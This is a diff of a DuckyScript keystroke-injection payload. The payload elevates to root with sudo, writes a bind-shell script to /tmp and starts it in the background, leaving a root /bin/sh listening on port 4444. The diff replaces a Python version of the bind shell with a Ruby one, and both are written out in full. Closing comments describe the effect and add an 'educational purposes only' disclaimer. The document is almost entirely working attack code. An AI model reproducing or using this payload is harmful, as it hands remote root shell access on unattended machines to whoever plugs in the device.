@@ -12,12 +12,12 @@ STRING sudo su
 ENTER
 STRING (password)
 ENTER
-STRING echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(('<server host>',4444));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0); os.dup2(c.fileno(),1); os.dup2(c.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" > /tmp/shell.py
+STRING echo "require 'socket';server=TCPServer.new('<server host>',4444);client=server.accept;$stdin.reopen(client);$stdout.reopen(client);$stderr.reopen(client);exec '/bin/sh','-i'" > /tmp/shell.rb
 ENTER
-STRING python /tmp/shell.py &
+STRING ruby /tmp/shell.rb &
 ENTER
 
 
-REM This script opens a terminal, elevates to root privileges, creates a Python script that sets up a bind shell <server host> on port 4444, and runs the script in the background. The target server will now be listening <server host> on port 4444 for incoming connections.
+REM This script opens a terminal, elevates to root privileges, creates a ruby script that sets up a bind shell <server host> on port 4444, and runs the script in the background. The target server will now be listening <server host> on port 4444 for incoming connections.
 
 REM Please note that using such scripts for unauthorized access is illegal and unethical. This example is provided for educational purposes only.
